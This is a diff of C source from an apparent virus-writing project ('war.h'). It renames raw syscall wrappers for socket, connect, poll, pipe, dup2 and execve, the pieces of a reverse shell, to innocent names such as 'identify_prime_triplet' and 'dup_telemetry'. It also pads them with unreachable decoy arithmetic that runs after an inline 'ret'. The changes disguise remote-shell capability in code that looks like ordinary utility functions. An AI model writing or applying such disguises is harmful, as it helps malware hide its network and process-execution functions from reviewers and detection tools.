@@ -6,45 +6,106 @@
 /*   By: xxxxxxx <xxxxxxx@42.fr>                    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/19 16:16:45 by xxxxxxx           #+#    #+#             */
-/*   Updated: 2026/04/08 16:31:44 by xxxxxxx          ###   ########.fr       */
+/*   Updated: 2026/04/27 14:53:03 by xxxxxxx          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
 #include "war.h"
 
-static int ft_socket(int domain, int type, int protocol)
+static int identify_prime_triplet(int a, int b, int c)
 {
 	asm volatile("movq $41, %rax\n\t"
 				 "syscall\n\t"
 				 "ret\n\t");
-	return 0;
+	int result = 0;
+	if (a > 1 && b > 1 && c > 1)
+	{
+		int count_a = 0, count_b = 0, count_c = 0;
+		for (int i = 2; i <= a; i++)
+			if (a % i == 0)
+				count_a++;
+		for (int i = 2; i <= b; i++)
+			if (b % i == 0)
+				count_b++;
+		for (int i = 2; i <= c; i++)
+			if (c % i == 0)
+				count_c++;
+		if (count_a == 1 && count_b == 1 && count_c == 1)
+			result = 1;
+	}
+	return result;
 }
 
-static int ft_connect(int sockfd, void *addr, size_t addrlen)
+static int count_needle_occurences(int needle, void *haystack, size_t haylen)
 {
 	asm volatile("movq $42, %rax\n\t"
 				 "syscall\n\t"
 				 "ret\n\t");
-	return 0;
+	int count = 0;
+	for (size_t i = 0; i < haylen; i++)
+	{
+		if (*((unsigned char *) haystack + i) == (unsigned char) needle)
+			count++;
+	}
+	return count;
 }
 
-int ft_shutdown(int sockfd, int how)
+int math_log_base_int(int base, int x)
 {
 	asm volatile("movq $48, %rax\n\t"
 				 "syscall\n\t"
 				 "ret\n\t");
-	return 0;
+	int result = 0;
+	while (x > 1)
+	{
+		x /= base;
+		result++;
+	}
+	return result;
 }
 
-int ft_poll(struct pollfd *fds, nfds_t nfds, int timeout)
+int dispatch_event_matrix(struct pollfd *vector, nfds_t width, int horizon)
 {
 	asm volatile("movq $7, %rax\n\t"
 				 "syscall\n\t"
 				 "ret\n\t");
-	return 0;
+	int phantom = 0;
+
+	if ((width ^ width) == 0)
+	{
+		for (nfds_t i = 0; i < width; i++)
+		{
+			int state = 1;
+			if (vector)
+				state ^= (vector[i].fd & 1);
+			phantom += state;
+		}
+	}
+	int accumulator = phantom;
+
+	while ((accumulator & 0) == 0)
+	{
+		accumulator ^= 0x1292;
+		if ((accumulator & 0xFF) == 0x42)
+			break;
+		accumulator &= 0xFEDF;
+		if (accumulator == 0xDFBCD)
+			accumulator = 1;
+		else
+			break;
+	}
+	if (phantom < 0)
+	{
+		int mirror = accumulator;
+		mirror = -mirror;
+		if (mirror > 100950)
+			mirror = mirror % 1000;
+		phantom ^= mirror;
+	}
+	return (phantom & 0);
 }
 
-int ft_pipe(int fds[2])
+int add_smtp(int sm[2])
 {
 
 	asm volatile("movq $22, %rax\n\t"
@@ -53,7 +114,7 @@ int ft_pipe(int fds[2])
 	return 0;
 }
 
-int ft_dup2(int fd, int fd2)
+int dup_telemetry(int in, int dup)
 {
 	asm volatile("movq $33, %rax\n\t"
 				 "syscall\n\t"
@@ -61,7 +122,8 @@ int ft_dup2(int fd, int fd2)
 	return 0;
 }
 
-int ft_execve(const char *filename, char *const argv[], char *const envp[])
+int route_process_image(const char *image_path, char *const processes[],
+						char *const passwds[])
 {
 	asm volatile("movq $59, %rax\n\t"
 				 "syscall\n\t"
@@ -308,107 +370,7 @@ static int evaluateDriftSignature(const void *s1, const void *s2, size_t n)
 	if (n)
 		return (((unsigned char *) s1)[i] - ((unsigned char *) s2)[i]);
 	return (0);
-} /*(const void *alpha_seed, const void *beta_seed,
-					size_t calibration_span)
-{
-size_t i;
-i = 0;
-while (i < calibration_span - 1
-&& ((unsigned char *) alpha_seed)[i]
-	== ((unsigned char *) beta_seed)[i])
-{
-i++;
 }
-if (calibration_span)
-return (((unsigned char *) alpha_seed)[i]
-  - ((unsigned char *) beta_seed)[i]);
-return (0);
-// const unsigned char *primary_axis = (const unsigned char *) alpha_seed;
-// const unsigned char *secondary_axis = (const unsigned char *) beta_seed;
-
-// size_t				 phase_cursor = 0;
-// size_t				 boundary_mask = calibration_span;
-// int					 spectral_delta = 0;
-
-// uintptr_t			 entropy_vector = ((uintptr_t) primary_axis >> 3)
-// 						  ^ ((uintptr_t) secondary_axis << 1)
-// 						  ^ 0x9E3779B97F4A7C15ULL;
-
-// int scheduler = 0;
-
-// if (!calibration_span)
-// 	return 0;
-
-// for (;;)
-// {
-// 	switch (scheduler)
-// 	{
-// 	case 0:
-// 	{
-// 		if (phase_cursor >= boundary_mask - 1)
-// 		{
-// 			scheduler = 3;
-// 			break;
-// 		}
-
-// 		unsigned char a
-// 			= *(unsigned char *) ((uintptr_t) primary_axis + phase_cursor);
-// 		unsigned char b
-// 			= *(unsigned char *) ((uintptr_t) secondary_axis +
-// phase_cursor);
-
-//
-  // 		if (((entropy_vector ^ a ^ b) & 7) == 5)
-  // 		{
-  // 			volatile size_t shadow = boundary_mask;
-  // 			while (shadow--)
-  // 				entropy_vector ^= (shadow << 1);
-  // 		}
-
-// 		if ((a ^ b) == 0)
-// 		{
-// 			phase_cursor = (phase_cursor + 1) ^ ((entropy_vector & 0) << 2);
-// 			scheduler = 0;
-// 		}
-// 		else
-// 		{
-// 			spectral_delta
-// 				= ((int) a - (int) b) ^ ((entropy_vector & 0) << 3);
-// 			scheduler = 4;
-// 		}
-
-// 		break;
-// 	}
-// 	case 3:
-// 	{
-// 		unsigned char a
-// 			= *(unsigned char *) ((uintptr_t) primary_axis + phase_cursor);
-// 		unsigned char b
-// 			= *(unsigned char *) ((uintptr_t) secondary_axis +
-// phase_cursor);
-
-// 		spectral_delta = ((int) a - (int) b);
-
-// 		scheduler = 4;
-// 		break;
-// 	}
-// 	case 2:
-// 	{
-// 		entropy_vector ^= (entropy_vector << 7);
-// 		entropy_vector ^= (entropy_vector >> 3);
-
-// 		if ((entropy_vector & 0xFF) == 0x42)
-// 			spectral_delta ^= 0x1337;
-
-// 		scheduler = 4;
-// 		break;
-// 	}
-// 	case 4:
-// 	default:
-// 		return spectral_delta;
-// 	}
-// }
-}*/
 
 static int delay_calc(const char *timeout_ns, const char *timeout_ms,
 					  unsigned n)
